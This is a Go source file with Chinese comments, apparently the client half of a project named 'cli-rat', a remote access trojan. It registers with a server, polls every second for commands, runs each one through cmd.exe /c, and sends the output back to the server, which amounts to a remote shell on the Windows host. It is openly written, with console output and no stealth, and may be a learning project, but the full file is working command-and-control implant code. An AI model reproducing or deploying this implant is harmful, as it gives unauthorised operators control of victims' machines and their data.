// Package main 是客户端的入口程序
// 负责连接服务端、轮询命令并执行
package main

import (
	"bufio"
	"cli-rat/pkg/httpclient"
	"cli-rat/pkg/storage"
	"fmt"
	"os"
	"os/exec"
	"time"
)

const (
	// defaultServerAddr 默认服务端地址
	defaultServerAddr = "http://localhost:8080"
	// clientName 客户端名称
	clientName = "client"
	// clientFile 客户端ID存储文件
	clientFile = "client.id"
	// pollInterval 轮询间隔时间
	pollInterval = 1 * time.Second
)

// Client 客户端结构体
// 封装了客户端的所有功能
type Client struct {
	apiClient  *httpclient.Client // HTTP通信客户端
	clientID   string             // 客户端唯一ID
	serverAddr string             // 服务端地址
}

// New 创建新的客户端实例
// serverAddr: 服务端地址
func New(serverAddr string) *Client {
	return &Client{
		apiClient:  httpclient.NewClient(serverAddr),
		serverAddr: serverAddr,
	}
}

// Register 向服务端注册客户端
// 返回错误信息（如果注册失败）
func (c *Client) Register() error {
	// 调用服务端注册接口
	resp, err := c.apiClient.Register(clientName)
	if err != nil {
		return err
	}

	// 保存分配的客户端ID
	c.clientID = resp.ClientID
	storage.SaveClientID(clientFile, c.clientID)
	fmt.Printf("[注册成功] ClientID: %s\n", c.clientID)
	return nil
}

// VerifyClientID 验证客户端ID是否有效
// 通过尝试轮询服务端来验证
// 返回是否有效
func (c *Client) VerifyClientID() bool {
	if c.clientID == "" {
		return false
	}

	// 尝试轮询，无错误即表示ID有效
	_, err := c.apiClient.Poll(c.clientID)
	return err == nil
}

// LoadClientID 从文件加载客户端ID
// 如果文件存在，读取并恢复客户端ID
func (c *Client) LoadClientID() {
	c.clientID = storage.LoadClientID(clientFile)
	if c.clientID != "" {
		fmt.Printf("[恢复] 已有ClientID: %s\n", c.clientID)
	}
}

// Unregister 向服务端注销客户端
// 删除本地ID文件
func (c *Client) Unregister() {
	if c.clientID == "" {
		return
	}
	// 调用服务端注销接口
	c.apiClient.Unregister(c.clientID)
	// 删除本地ID文件
	os.Remove(clientFile)
}

// PollAndExecute 轮询并执行命令
// 主循环：定期轮询服务端，获取命令并执行
// 阻塞运行，直到收到退出命令
func (c *Client) PollAndExecute() {
	for {
		// 如果没有客户端ID，等待后继续
		if c.clientID == "" {
			time.Sleep(pollInterval)
			continue
		}

		// 轮询服务端获取命令
		resp, err := c.apiClient.Poll(c.clientID)
		if err != nil {
			// 轮询失败，等待后重试
			time.Sleep(pollInterval)
			continue
		}

		// 检查是否有待执行命令
		if resp.Status == "no_command" {
			time.Sleep(pollInterval)
			continue
		}

		// ===== 检查是否为退出命令 =====
		if resp.Content == "__EXIT__" {
			fmt.Println("[服务端请求退出]")
			// 提交退出完成
			c.apiClient.Submit(resp.ID, "completed", "client exited")
			// 注销并退出程序
			c.Unregister()
			os.Exit(0)
		}

		// ===== 执行命令 =====
		fmt.Printf("[执行命令] %s\n", resp.Content)

		// 执行命令并获取结果
		output, err := c.executeCommand(resp.Content)
		status := "completed"
		if err != nil {
			// 执行失败
			status = "failed"
			output = err.Error()
		}

		// 提交执行结果
		c.apiClient.Submit(resp.ID, status, output)
		fmt.Printf("[完成] 状态: %s\n", status)

		// 等待下次轮询
		time.Sleep(pollInterval)
	}
}

// executeCommand 执行系统命令
// cmd: 要执行的命令字符串
// 返回命令输出和错误信息
func (c *Client) executeCommand(cmd string) (string, error) {
	if cmd == "" {
		return "", fmt.Errorf("空命令")
	}

	// Windows: 使用 cmd.exe /c 执行命令
	// 这支持Windows内置命令如 dir, cd 等
	cmdExec := exec.Command("cmd.exe", "/c", cmd)

	// 执行命令并获取输出（包括标准输出和错误输出）
	output, err := cmdExec.CombinedOutput()
	if err != nil {
		return string(output), err
	}

	return string(output), nil
}

// main 程序入口
func main() {
	fmt.Println("=== 客户端启动 ===")
	fmt.Printf("服务端地址: %s\n", defaultServerAddr)
	fmt.Printf("轮询间隔: %v\n", pollInterval)

	// 创建客户端实例
	client := New(defaultServerAddr)

	// 尝试恢复已有的客户端ID
	client.LoadClientID()

	// 验证或重新注册
	if client.clientID != "" && !client.VerifyClientID() {
		fmt.Println("[验证] ClientID无效，重新注册...")
		client.clientID = ""
		os.Remove(clientFile)
	}

	// 注册客户端
	if err := client.Register(); err != nil {
		fmt.Printf("[注册失败] %v\n", err)
		fmt.Println("将在轮询时重试...")
	}

	// 启动轮询循环（后台运行）
	go client.PollAndExecute()

	// 等待用户按回车键退出
	fmt.Println("[监听] 按回车键退出...")
	bufio.NewReader(os.Stdin).ReadLine()

	// 用户主动退出，注销客户端
	client.Unregister()
	fmt.Println("客户端已退出")
}
